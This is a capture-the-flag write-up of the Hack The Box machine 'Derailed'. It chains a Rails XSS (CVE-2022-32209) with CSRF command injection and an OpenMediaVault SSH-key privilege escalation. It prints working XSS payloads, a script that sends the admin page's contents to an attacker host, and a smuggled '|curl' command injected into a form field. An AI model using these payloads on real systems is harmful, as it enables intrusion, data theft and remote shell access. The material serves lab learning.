---
description: >-
  XSS + CSRF for foothold, followed by exploiting OMV via the SSH module after
  finding hidden credentials.
---

# Derailed

## Gaining Access

As usual, we start with an Nmap scan:

<figure><img src="../../../.gitbook/assets/image (3640).png" alt=""><figcaption></figcaption></figure>

Port 3000 was found to be a HTTP port leading us to this Clipnotes page.

### Directory Enum

<figure><img src="../../../.gitbook/assets/image (3904).png" alt=""><figcaption></figcaption></figure>

Wasn't much to play around with, as we had no credentials yet. Decided to run a directory scan to find if there are any endpoints. Eventually, I found this /rails endpoint, using dirsearch.

<figure><img src="../../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2280).png" alt=""><figcaption></figcaption></figure>

Interesting. This presented a lot of information for me and also tells me this is a Ruby on Rails project. Another interesting directory was the **/administration** panel which I could not view at all. This is the information from the info endpoint:

<figure><img src="../../../.gitbook/assets/image (2666).png" alt=""><figcaption></figcaption></figure>

From here, we can try to fuzz out other information and endpoints on this /rail directory. I used feroxbuster for its recursive search function.

<figure><img src="../../../.gitbook/assets/image (691).png" alt=""><figcaption></figcaption></figure>

This directory basically shows us every single path there was in the website:

<figure><img src="../../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>

### /clipnotes

Earlier, we saw some form of clipnote function. Testing it shows us that each time we create a new one, it is stored on the server somewhere. Notice that this one I created was 110.

<figure><img src="../../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

&#x20;Using the **/clipnotes/raw/:id** format, I was able to view the first clipnote, submitted by a user called Alice. Visiting anything other than 1 was not possible.

<figure><img src="../../../.gitbook/assets/image (2852).png" alt=""><figcaption></figcaption></figure>

I was interested in what other number is present, so I used wfuzz to enumerate out all other numbers. None are present it seems

<figure><img src="../../../.gitbook/assets/image (1559).png" alt=""><figcaption></figcaption></figure>

I checked out the other endpoints, as there may be more interesting ones. The **/report** one looks good.

### /report

<figure><img src="../../../.gitbook/assets/image (3643).png" alt=""><figcaption></figcaption></figure>

Submitting a report reveals tells us that an admin would look at it. This tells me that perhaps, there is a form of XSS present on the site.

When looking at the POST request for the report, we can see that it sends this authenticity\_token:

<figure><img src="../../../.gitbook/assets/image (4060).png" alt=""><figcaption></figcaption></figure>

However, the cookies have been set to HttpOnly, meaning that stealing cookies is pointless in this case. XSS on the administrator could either allow us to enumerate more about the /administration page, or simply to steal his cookie and impersonate him.

Because this is clearly an XSS challenge, I thought of first finding a potential XSS entry.&#x20;

### Finding XSS Point

I messed around a lot with the clipnotes and tried all sorts of stuff, but it wasn't loading Javascript. Then I realised that the **author** of the clipnotes was something that I controlled. Perhaps, I could overflow the thing or try to register a malicious user. Since the page renders that username, this could potentially be vulnerable.

So I started a HTTP server, and attempted this:

<figure><img src="../../../.gitbook/assets/image (3753).png" alt=""><figcaption></figcaption></figure>

The reason I did this was because I am aware that there is a potential limit to the username, and trying to overflow that may cause the end bit to be rendered as JS code. Then I created a clipnote:

<figure><img src="../../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

The overflow kind of worked, managed to remove the last portion about the created bit. I then went to try various different payloads including \<img> tags and stuff. DIdn't really work. I then suspected this has to do with some kind of CVE that was released recently (usual pattern of HTB, uses CVEs from 2022), and went hunting for Ruby + XSS related exploits that came out recently.

I eventually found CVE-2022-32209, which was a XSS exploit for Rails::Html::Sanitizer. &#x20;

{% embed url="https://groups.google.com/g/rubyonrails-security/c/ce9PhUANQ6s?pli=1" %}

Seems that the \<select> tag was being used maliciously. I then tried the same overflow trick with this payload:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://10.10.14.29/xss.pls'>
```

<figure><img src="../../../.gitbook/assets/image (1107).png" alt=""><figcaption></figcaption></figure>

This worked! I was able to get a callback as well:

<figure><img src="../../../.gitbook/assets/image (3056).png" alt=""><figcaption></figcaption></figure>

Now, we just need to find a way to exploit this XSS.

### XSS for /administrator

Understanding that we now have XSS, I was thinking of using CSRF in order to retrieve more information about the /administration page. The reason CSRF is used is because **CSRF tokens do not protect against XSS.** We had a simple rails cookie that was HttpOnly, so XSS needs to do something else.

Since we can basically execute basic web requests using our username, we need to think of how to redirect the user somewhere. We can abuse the **eval** function to inject malicious JS code.&#x20;

First, I made a simple script that would callback to our machine.

```javascript
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "http://10.10.14.29/stringcallback", false);
xmlHttp.send(null);
```

Then I encoded it using Base64, and wanted to see if I was able to get the callback I wanted using event attributes. The end username was this:

{% code overflow="wrap" %}
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://10.10.14.29/imgfail' onerror="eval(decode64('dmFyIHhtbEh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKeG1sWG1sSHR0cC5vcGVuKCJHRVQiLCAiaHR0cDovLzEwLjEwLjE0LjI5L3NjcmlwdGNhbGxiYWNrIiwgdHJ1ZSk7CnhtbEh0dHAuc2VuZChudWxsKTs='))">
```
{% endcode %}

Base64 Encoding did not work, so I tried with Char Coding instead. What Char Coding does is basically translate all the characters within my script to become ASCII letters.&#x20;

The payload becomes this:

{% code overflow="wrap" %}
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://10.10.14.29/imgfail' onerror="eval(String.fromCharCode(118, 97, 114, 32, 120, 109, 108, 72, 116, 116, 112, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 10, 120, 109, 108, 72, 116, 116, 112, 46, 111, 112, 101, 110, 40, 34, 71, 69, 84, 34, 44, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 57, 47, 115, 116, 114, 105, 110, 103, 99, 97, 108, 108, 98, 97, 99, 107, 34, 44, 32, 102, 97, 108, 115, 101, 41, 59, 10, 120, 109, 108, 72, 116, 116, 112, 46, 115, 101, 110, 100, 40, 110, 117, 108, 108, 41, 59))">
```
{% endcode %}

This payload worked! I was able to retrieve two callbacks after creating the clipnote.

<figure><img src="../../../.gitbook/assets/image (3918).png" alt=""><figcaption></figcaption></figure>

Now we can use a script from Hacktricks to steal the page content of the administration panel.&#x20;

```javascript
var url = "http://derailed.htb:3000/administration";
var attacker = "http://10.10.14.29/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);
```

Then, we can send it via the same method **and make sure to report the clipnote to make the administrator load the page.**

Here is the page contents:

```markup
<!DOCTYPE html>
<html>
<head>
  <title>derailed.htb</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>

  <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="ai4X_c_tZvC3ki96jPtvknwCMO09xlyDCELsf-J6ZApWjImNydnSRPjXQmz00ViOwDEv-RsQ__aIs2UAQQ9eyw" />
  

  <!-- Warning !! ensure that "stylesheet_pack_tag" is used, line below -->
  
  <script src="/packs/js/application-135b5cfa2df817d08f14.js" data-turbolinks-track="reload"></script>

  <link href="/js/vs/editor/editor.main.css" rel="stylesheet"/>
  <!-- Favicon-->
  <link rel="icon" type="image/x-icon" href="/assets/favicon.ico"/>
  <!-- Font Awesome icons (free version)-->
  <script src="https://use.fontawesome.com/releases/v6.1.0/js/all.js" crossorigin="anonymous"></script>
  <!-- Google fonts-->
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css"/>
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
  <!-- Core theme CSS (includes Bootstrap)-->
  <link href="/css/styles.css" rel="stylesheet"/>
</head>
<body id="page-top">
<!-- Navigation-->
<nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
  <div class="container">
    <a class="navbar-brand" href="/">CLIPNOTES</a>
    <button class="navbar-toggler text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
      Menu
      <i class="fas fa-bars"></i>
    </button>
    <div class="collapse navbar-collapse" id="navbarResponsive">
      <ul class="navbar-nav ms-auto">



            <li class="nav-item mx-0 mx-lg-1">
              <a class="nav-link py-3 px-0 px-lg-3 rounded" href="/administration">Administration</a>
            </li>


          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded" href="/logout">Logout</a>
          </li>


      </ul>
    </div>
  </div>
</nav>

<header class="masthead">

  


  <style>
      button {
          background: none !important;
          border: none;
          padding: 0 !important;
          font-family: arial, sans-serif;
          color: #069;
          text-decoration: underline;
          cursor: pointer;
          margin-left: 30px;
      }
  </style>


  <div class="container">

    <h3>Reports</h3>




      <form method="post" action="/administration/reports">

        <input type="hidden" name="authenticity_token" id="authenticity_token" value="3FpuEfe4p4sG0ARCAsi_6afj9qw6kZqL55PSTA4ZP1fg-PBh8YwTP0mVaVR64oj1G9DpuBxHOf5nYlszrWwFlg" autocomplete="off" />

        <input type="text" class="form-control" name="report_log" value="report_14_12_2022.log" hidden>

        <label class="pt-4"> 14.12.2022</label>

        <button name="button" type="submit">
          <i class="fas fa-download me-2"></i>
          Download
        </button>


      </form>






  </div>

</header>


<!-- Footer-->
<footer class="footer text-center">
  <div class="container">
    <div class="row">
      <!-- Footer Location-->
      <div class="col-lg-4 mb-5 mb-lg-0">
        <h4 class="text-uppercase mb-4">Location</h4>
        <p class="lead mb-0">
          2215 John Daniel Drive
          <br/>
          Clark, MO 65243
        </p>
      </div>
      <!-- Footer Social Icons-->
      <div class="col-lg-4 mb-5 mb-lg-0">
        <h4 class="text-uppercase mb-4"><a href="http://derailed.htb">derailed.htb</a></h4>
        <a class="btn btn-outline-light btn-social mx-1" href="#!"><i class="fab fa-fw fa-facebook-f"></i></a>
        <a class="btn btn-outline-light btn-social mx-1" href="#!"><i class="fab fa-fw fa-twitter"></i></a>
        <a class="btn btn-outline-light btn-social mx-1" href="#!"><i class="fab fa-fw fa-linkedin-in"></i></a>
        <a class="btn btn-outline-light btn-social mx-1" href="#!"><i class="fab fa-fw fa-dribbble"></i></a>
      </div>
      <!-- Footer About Text-->
      <div class="col-lg-4">
        <h4 class="text-uppercase mb-4">About derailed.htb</h4>
        <p class="lead mb-0">
          derailed.htb is a free to use service, which allows users to create notes within a few seconds.
        </p>
      </div>
    </div>
  </div>
</footer>
<!-- Copyright Section-->
<div class="copyright py-4 text-center text-white">
  <div class="container"><small>Copyright &copy; derailed.htb 2022</small></div>
</div>

<!-- Bootstrap core JS-->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="/js/scripts.js"></script>
<script src="https://cdn.startbootstrap.com/sb-forms-latest.js"></script>
</body>
</html>
```

### CSRF RCE

When analysing the contents of this, there is one form that is available on the page:

```markup
<h3>Reports</h3>
      <form method="post" action="/administration/reports">
        <input type="hidden" name="authenticity_token" id="authenticity_token" value="3FpuEfe4p4sG0ARCAsi_6afj9qw6kZqL55PSTA4ZP1fg-PBh8YwTP0mVaVR64oj1G9DpuBxHOf5nYlszrWwFlg" autocomplete="off" />
        <input type="text" class="form-control" name="report_log" value="report_14_12_2022.log" hidden>
        <label class="pt-4"> 14.12.2022</label>
        <button name="button" type="submit">
          <i class="fas fa-download me-2"></i>
          Download
        </button>
      </form>
```

This form seems to download something and it has a value that is fixed. Since this is a POST request, we need to use CSRF to make the administrator send a request. The `value` parameter looked rather suspicious because it seems exploitable to an LFI.

So when doing CSRF, our payload would first need to do this:

* Retrieve the authenticity\_token value because we need that to verify we are indeed the administrator
* Send the POST request with an edited `report_log` value.
* Have a small delay to ensure that the page would load fully before attempting to find the elements required. I set the delay to 3 seconds.

I did some research around Ruby vulnerabilities, and found a few good articles:

{% embed url="https://bishopfox.com/blog/ruby-vulnerabilities-exploits" %}

Potentially, this form might be using the `open` function, which is vulnerable to RCE because of a deserialization exploit. I wanted to test this first. As such, I created this quick script:

```javascript
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://derailed.htb:3000/administration", true);
xmlHttp.send( null );

setTimeout(function() {
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var token = doc.getElementById('authenticity_token').value;
    var newForm = new DOMParser().parseFromString('<form id="badform" method="post" action="/administration/reports">    <input type="hidden" name="authenticity_token" id="authenticity_token" value="placeholder" autocomplete="off">    <input id="report_log" type="text" class="form-control" name="report_log" value="placeholder" hidden="">    <button name="button" type="submit">Submit</button>', 'text/html');
    document.body.append(newForm.forms.badform);
    document.getElementById('badform').elements.report_log.value = '|curl http://10.10.14.29/rcecfmed';
    document.getElementById('badform').elements.authenticity_token.value = token;
    document.getElementById('badform').submit();
}, 3000);
```

When waiting around, I eventually got a callback via the `curl` command I injected.

<figure><img src="../../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

With this, we can easily gain a reverse shell through this method. I used the `mkfifo` shell, and it worked!

<figure><img src="../../../.gitbook/assets/image (3816).png" alt=""><figcaption></figcaption></figure>

We can grab the user flag while we're here.

## Privilege Escalation

To establish persistence, we can put our public key within the `~/.ssh/authorized_keys` folder. Then I looked around the `/var/www/` folder to find some credentials.

### Alice Credentials

When checking the available stuff, I found this `openmediavault` folder as well.

<figure><img src="../../../.gitbook/assets/image (788).png" alt=""><figcaption></figcaption></figure>

Within the `rails-app` directory, there was a `.git` repository.

<figure><img src="../../../.gitbook/assets/image (1251).png" alt=""><figcaption></figcaption></figure>

I checked the logs for this using an SSH shell instead, and found credentials for an `alice` user.

<figure><img src="../../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

This password was rather useless.

### Toby Credentials

WIthin the config file, we can find another password.&#x20;

<figure><img src="../../../.gitbook/assets/image (3741).png" alt=""><figcaption></figcaption></figure>

There was a sqlite3 file here. Within it, we can find this portion here with hashes for toby.

<figure><img src="../../../.gitbook/assets/image (1040).png" alt=""><figcaption></figcaption></figure>

Checking the `/etc/passwd` file, we can see that the openmediavault-webgui user is Toby Wright.

<figure><img src="../../../.gitbook/assets/image (2198).png" alt=""><figcaption></figcaption></figure>

I extracted this hash and attempted to crack it.

<figure><img src="../../../.gitbook/assets/image (1672).png" alt=""><figcaption></figcaption></figure>

WIth this, we can `su` to the openmediavault-webgui user.

<figure><img src="../../../.gitbook/assets/image (993).png" alt=""><figcaption></figcaption></figure>

### OpenMediaVault

I saw earlier there was some `omv` instance running on the machine. Running a `netstat -tulpn` confirms this to be running on port 80.

<figure><img src="../../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

Also, I saw this config file when re-running LinPEAS.

<figure><img src="../../../.gitbook/assets/image (2974).png" alt=""><figcaption></figcaption></figure>

Open Media Vault is a network-attahced storage system, and I wanted to take a look into it. We can port forward this via `chisel`.

<figure><img src="../../../.gitbook/assets/image (1975).png" alt=""><figcaption></figcaption></figure>

I couldn't find the creds for this to login, so I was unable to exploit it.

### OMV Config&#x20;

I took a look at the config files that we had access to. There was one portion that was interesting.

<figure><img src="../../../.gitbook/assets/image (3638).png" alt=""><figcaption></figcaption></figure>

There were user entries, and they seemed to accept a `name` and an `sshpubkeys`. Perhaps this could be used to update the SSH for the machine or something. Checking our `id`, it seems we can edit this config file and update it as well.

<figure><img src="../../../.gitbook/assets/image (1149).png" alt=""><figcaption></figcaption></figure>

The `/usr/sbin` file contains loads of `omv` related tools too:

<figure><img src="../../../.gitbook/assets/image (2824).png" alt=""><figcaption></figcaption></figure>

This website on the OMV website was very helpful:

{% embed url="https://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/" %}

The vulnerability here is that the `config.xml` file is owned by our current user and can be changed, allowing us to enable SSH access to any user within the machine using a public key of our choosing. This can be done by editing the config file within the machine.

There are 2 entries within the machine, one for `rails` and one for `test`. We can edit the `test` one for the root user, and use `ssh-keygen -t rsa; ssh-keygen -e -f ~/.ssh/id_rsa.pub` to generate the needed key in the right format.

<figure><img src="../../../.gitbook/assets/image (2929).png" alt=""><figcaption></figcaption></figure>

Note that we need to add the `<sshpubkey>` tag because we are specifying a new object. Then, we need to reset the OMV instance to read the new config file. From the OMV documentation, we can use the `omv-confdbadm` file to do so.

{% embed url="https://docs.openmediavault.org/en/6.x/development/tools/omv_confdbadm.html" %}

<figure><img src="../../../.gitbook/assets/image (1882).png" alt=""><figcaption></figcaption></figure>

Then, we need to make changes to edit the SSH module for the OMV instance. This can be done using `omv-rpc` to force a config update for the SSH module.

<figure><img src="../../../.gitbook/assets/image (744).png" alt=""><figcaption></figcaption></figure>

Interesting root for this machine. OMV is something that I don't see around often.
